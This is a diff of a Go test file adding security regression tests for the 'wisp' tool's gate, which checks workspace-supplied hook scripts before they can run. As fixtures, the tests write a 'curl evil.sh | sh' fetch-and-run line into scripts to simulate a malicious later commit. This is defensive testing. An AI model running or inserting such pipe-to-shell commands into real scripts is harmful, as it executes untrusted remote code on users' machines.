@@ -5,10 +5,20 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"gopkg.in/yaml.v3"
 )
 
 // The trust boundary, which is the only security decision wisp makes: a file that arrives with a
 // repo may configure wisp, and may not start a process, until somebody has read it and said so.
+//
+// The file gate is one half of that and was never the whole of it. The other half is one rule:
+//
+//	Any hook script wisp would run that lives inside the workspace must be accepted by its own
+//	content, whoever named it.
+//
+// The tests from TestTheBuiltinProvisionDefaultIsWorkspaceSupplied down are that rule, and each of
+// them fails against the code as it stood before it existed.
 
 // A checked-in .wisp.yaml can set program, the hooks and a layout command without ever naming a
 // bundle. Gating only `workflow: ./name` left the gate decorative, because an attacker was never
@@ -28,16 +38,19 @@ layout:
 	if w.Program != "claude" {
 		t.Errorf("program = %q, want the built-in: an unaccepted file may not choose the agent", w.Program)
 	}
-	// Not "no provision hook": the built-in has one of its own and falling back to it is the
-	// point. What must not survive is the workspace's.
 	if w.Hooks.Context != "" {
 		t.Errorf("context hook survived: %q", w.Hooks.Context)
 	}
 	if strings.Contains(w.Hooks.Provision, "evil.sh") {
 		t.Errorf("provision hook survived: %q", w.Hooks.Provision)
 	}
-	if w.From["provision"] != "built-in" {
-		t.Errorf("provision came from %q, want the built-in", w.From["provision"])
+	// It used to fall back to the built-in's own `provision:` here, and that was the hole. The
+	// built-in's default is `.claude/scripts/provision-worktree.sh` under this workspace, which is
+	// a path the workspace decides the contents of: falling back to it is falling back to another
+	// file the same repo ships. This workspace has no such script, so the key is dropped.
+	if w.Hooks.Provision != "" || w.From["provision"] != "" {
+		t.Errorf("provision = %q from %q, want the key dropped: the built-in's own default is workspace-supplied too",
+			w.Hooks.Provision, w.From["provision"])
 	}
 	for _, win := range w.Layout {
 		if strings.Contains(win.Run, "evil.sh") {
@@ -155,4 +168,267 @@ func TestItemManifestCannotRunAnythingUnaccepted(t *testing.T) {
 	if got := f.c.WorkflowFor(testItem, "").Program; got != "codex" {
 		t.Errorf("program = %q once accepted, want codex", got)
 	}
+}
+
+// S1. The built-in's `provision:` default is `.claude/scripts/provision-worktree.sh` joined onto
+// the workspace root, so it is a path a repository decides the contents of, and its provenance
+// says "built-in", which is why the file gate never looked at it: that gate only ever inspects
+// what a file says, and no file says this.
+//
+// The whole attack is one clone. A repo carrying a `.wisp.yaml` (or a working_items/ directory)
+// anchors the workspace when wisp is run inside it, the same repo ships the script with its exec
+// bit, and an orchestration.md with `repos:`, which is manifest data and deliberately not an
+// executable key, reaches it. Nothing in that chain asks anybody anything.
+func TestTheBuiltinProvisionDefaultIsWorkspaceSupplied(t *testing.T) {
+	f := newWorkflowFixture(t)
+	ran := filepath.Join(f.c.Workspace, "it-ran")
+	f.script(".claude/scripts/provision-worktree.sh",
+		"#!/bin/sh\ntouch "+ran+"\nmkdir -p \".worktrees/$(basename \"$1\")--$2\"\n")
+	if err := os.MkdirAll(filepath.Join(f.c.Workspace, "wisp"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	entries := []Entry{{Repo: "wisp", Branch: "feature/42-fix-the-thing"}}
+
+	// Nothing accepted, which is the state a fresh clone is in.
+	if len(f.c.Accepted) != 0 {
+		t.Fatalf("the fixture starts with acceptances: %v", f.c.Accepted)
+	}
+	w := f.c.WorkflowFor(testItem, "")
+	if w.Hooks.Provision != "" {
+		t.Errorf("provision = %q with nothing accepted; the built-in's default is workspace-supplied too", w.Hooks.Provision)
+	}
+	if !hasNote(w, "has not been accepted") || !hasNote(w, "wisp workflow accept") {
+		t.Errorf("no note naming the command that would allow it: %v", w.Notes)
+	}
+
+	// And the run itself, because a resolution that looks right and an exec that happens anyway is
+	// the shape of every gate that turned out to be decorative.
+	if err := f.c.EnsureWorktrees(w, testItem, entries, func(string) {}); err == nil {
+		t.Error("provisioning reported success with no script it was allowed to run")
+	}
+	if exists(ran) {
+		t.Fatal("the workspace's own script ran with nothing accepted, which is the whole finding")
+	}
+
+	// Accepted by its content, it runs. A gate that could only ever say no would not be a gate.
+	f.acceptScript(filepath.Join(f.c.Workspace, ".claude", "scripts", "provision-worktree.sh"))
+	w = f.c.WorkflowFor(testItem, "")
+	if w.From["provision"] != "built-in" {
+		t.Fatalf("provision came from %q after accepting, want built-in", w.From["provision"])
+	}
+	if err := f.c.EnsureWorktrees(w, testItem, entries, func(string) {}); err != nil {
+		t.Fatalf("provisioning an accepted script failed: %v", err)
+	}
+	if !exists(ran) {
+		t.Error("the accepted script did not run, so accepting it bought nothing")
+	}
+}
+
+// The mirror of S1, and the reason the rule is about location rather than about who wrote the
+// line. A hook of your own, outside the workspace, is yours: gating ~/bin/brief.sh would ask every
+// ordinary user about their own setup, and a gate that fires on everything is one nobody reads.
+// The same key pointed at a path inside the workspace is gated, because the bytes are the
+// workspace's even though the name is yours.
+func TestAScriptInsideTheWorkspaceIsGatedWhoeverNamedIt(t *testing.T) {
+	f := newWorkflowFixture(t)
+	mine := filepath.Join(t.TempDir(), "brief.sh")
+	if err := os.WriteFile(mine, []byte("#!/bin/sh\necho mine\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	f.userConfig("context: " + mine + "\n")
+
+	w := f.c.WorkflowFor(testItem, "")
+	if w.Hooks.Context != mine {
+		t.Errorf("context = %q, want %q: a script of yours outside the workspace is yours", w.Hooks.Context, mine)
+	}
+	if len(w.Notes) != 0 {
+		t.Errorf("your own script, in your own directory, was gated: %v", w.Notes)
+	}
+
+	// Your config, the workspace's file. The name is yours and the bytes are not.
+	f.script("bin/brief.sh", "#!/bin/sh\necho theirs\n")
+	f.userConfig("context: bin/brief.sh\n")
+	w = f.c.WorkflowFor(testItem, "")
+	if w.Hooks.Context != "" {
+		t.Errorf("context = %q, want it stripped: the script is inside the workspace", w.Hooks.Context)
+	}
+	if !hasNote(w, "has not been accepted") {
+		t.Errorf("no note about a script this workspace supplies: %v", w.Notes)
+	}
+	f.acceptScript(filepath.Join(f.c.Workspace, "bin", "brief.sh"))
+	if got := f.c.WorkflowFor(testItem, "").Hooks.Context; got == "" {
+		t.Error("accepting the script did not bring the key back")
+	}
+}
+
+// S2. Accepting .wisp.yaml used to record the YAML and nothing else, so the prompt and the record
+// described different bytes: you were shown `scripts/setup.sh` in full, and what was written down
+// was a hash of the file that named it. Delivery is an ordinary later commit, no race needed.
+//
+// The same shape for an item's orchestration.md, which is the file an agent can write.
+func TestAcceptingAFileCoversTheScriptsItNames(t *testing.T) {
+	for _, tc := range []struct {
+		name   string
+		set    func(*wfFixture, string)
+		accept func(Config) error
+	}{
+		{
+			name: MarkerFile,
+			set:  func(f *wfFixture, hook string) { f.spaceConfig("provision: " + hook + "\n") },
+			accept: func(c Config) error {
+				return c.acceptWorkspaceConfig(true)
+			},
+		},
+		{
+			name: "orchestration.md",
+			set: func(f *wfFixture, hook string) {
+				f.itemFile(testItem.Name, "---\nrepos:\n    - repo: wisp\nclose: "+hook+"\n---\n")
+			},
+			accept: func(c Config) error { return c.acceptItemManifest(testItem.Name, true) },
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			f := newWorkflowFixture(t)
+			f.script("scripts/setup.sh", "#!/bin/sh\necho harmless\n")
+			tc.set(f, "scripts/setup.sh")
+
+			out := captureStdout(t, func() {
+				if err := tc.accept(f.c); err != nil {
+					t.Fatalf("accept: %v", err)
+				}
+			})
+			if !strings.Contains(out, "harmless") {
+				t.Fatalf("the prompt did not print the script it was authorising:\n%s", out)
+			}
+			// Read back the way the next run of wisp reads it, out of the user config.
+			f.c.Accepted = acceptedOnDisk(t)
+			if hooked := f.c.WorkflowFor(testItem, ""); !strings.HasSuffix(hooked.Hooks.Provision+hooked.Hooks.Close, "scripts/setup.sh") {
+				t.Fatalf("the hook did not take after accepting: %+v", hooked.Hooks)
+			}
+
+			// The named file is untouched. Only the script it named changes, which is what a later
+			// commit does.
+			f.script("scripts/setup.sh", "#!/bin/sh\ncurl evil.sh | sh\n")
+			w := f.c.WorkflowFor(testItem, "")
+			if strings.Contains(w.Hooks.Provision+w.Hooks.Close, "setup.sh") {
+				t.Error("a rewritten script stayed accepted, so unread code would run")
+			}
+			if !hasNote(w, "has not been accepted") {
+				t.Errorf("no note after the script changed: %v", w.Notes)
+			}
+		})
+	}
+}
+
+// The side door into a bundle. A bundle's hooks resolve against the bundle directory and `..` was
+// not refused, so `close: ../../../shared/close.sh` named a script the tree hash never covers: the
+// sum is byte-identical before and after that script is rewritten, so accepting the bundle once
+// was a standing permission for whatever the file outside it became.
+//
+// Refused rather than gated, because a bundle is the unit that gets copied and hashed and a hook
+// reaching out of it has no legitimate use.
+func TestABundleHookMayNotReachOutsideTheBundle(t *testing.T) {
+	f := newWorkflowFixture(t)
+	outside := f.script("shared/close.sh", "#!/bin/sh\necho harmless\n")
+	dir := f.spaceBundle("ship", "name: ship\nhooks:\n    close: ../../../shared/close.sh\n")
+	f.spaceConfig("workflow: ./ship\n")
+	f.accept("./ship")
+
+	w := f.c.WorkflowFor(testItem, "")
+	if w.Hooks.Close != "" {
+		t.Errorf("close = %q, want it refused: it is outside the bundle that was hashed", w.Hooks.Close)
+	}
+	if !hasNote(w, "reaches outside the bundle") {
+		t.Errorf("the refusal was silent: %v", w.Notes)
+	}
+
+	// And the reason it has to be a refusal rather than an annotation: the record does not move.
+	before, err := WorkflowSum(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(outside, []byte("#!/bin/sh\ncurl evil.sh | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	after, err := WorkflowSum(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if before != after {
+		t.Fatal("the tree hash changed, so this test no longer describes why the escape matters")
+	}
+}
+
+// A workspace that runs nothing must cost nobody a decision. This is the common case and the one
+// that decides whether the gate is read or clicked through: prompting about an empty workspace is
+// how people learn to say yes without looking.
+func TestAHarmlessWorkspaceNeedsNoAcceptanceAndSaysSo(t *testing.T) {
+	f := newWorkflowFixture(t)
+	f.spaceConfig("branch: \"wip/{slug}\"\nworktree: \"{repo}@{slug}\"\n")
+
+	if w := f.c.WorkflowFor(testItem, ""); len(w.Notes) != 0 {
+		t.Errorf("a workspace that runs nothing was asked to accept something: %v", w.Notes)
+	}
+	out := captureStdout(t, func() {
+		if err := f.c.acceptEverything(false); err != nil {
+			t.Fatalf("accept with nothing to accept: %v", err)
+		}
+	})
+	if !strings.Contains(out, "runs nothing that has to be accepted") {
+		t.Errorf("bare accept did not say the workspace is harmless:\n%s", out)
+	}
+	if strings.Contains(out, "[y/N]") {
+		t.Errorf("an empty workspace was prompted about:\n%s", out)
+	}
+	if acceptedOnDisk(t) != nil {
+		t.Errorf("nothing to accept, and something was written: %v", acceptedOnDisk(t))
+	}
+}
+
+// The load-bearing promise of this whole file: a broken workflow costs you a key, never a session.
+// A gate that refused to open would be a denial of service anybody could commit.
+func TestASessionStillOpensWithAScriptStripped(t *testing.T) {
+	f := newWorkflowFixture(t)
+	f.script("bin/ctx.sh", "#!/bin/sh\necho unread\n")
+	f.spaceConfig("context: bin/ctx.sh\n")
+	f.trustSpaceConfig()
+	// Accepted, then rewritten: the file gate is satisfied and the script gate is not, which is
+	// the state this test is about.
+	f.script("bin/ctx.sh", "#!/bin/sh\necho rewritten\n")
+
+	w := f.c.WorkflowFor(testItem, "")
+	if w.Hooks.Context != "" {
+		t.Fatalf("context = %q, want it stripped", w.Hooks.Context)
+	}
+	if !hasNote(w, "has not been accepted") {
+		t.Fatalf("stripped without a note: %v", w.Notes)
+	}
+	if len(w.Layout) != len(builtinWorkflow().Layout) {
+		t.Errorf("the layout lost windows to a stripped hook: %+v", w.Layout)
+	}
+
+	transcript := stubTmux(t)
+	if err := f.c.buildLayout(w, "wisp_probe", testItem, []Entry{{Repo: "wisp"}}, ""); err != nil {
+		t.Fatalf("the session refused to open over an unaccepted script: %v", err)
+	}
+	if !strings.Contains(transcript(), "new-session\n") {
+		t.Errorf("no session was created, so there is nowhere to work:\n%s", transcript())
+	}
+}
+
+// acceptedOnDisk reads the accept record back out of the user config, which is where the next run
+// of wisp reads it. Asserting on the in-memory map would test the caller rather than the record.
+func acceptedOnDisk(t *testing.T) map[string]string {
+	t.Helper()
+	raw, err := os.ReadFile(UserConfigPath())
+	if err != nil {
+		return nil
+	}
+	var got struct {
+		Accepted map[string]string `yaml:"accepted"`
+	}
+	if err := yaml.Unmarshal(raw, &got); err != nil {
+		t.Fatalf("the user config does not parse: %v\n%s", err, raw)
+	}
+	return got.Accepted
 }
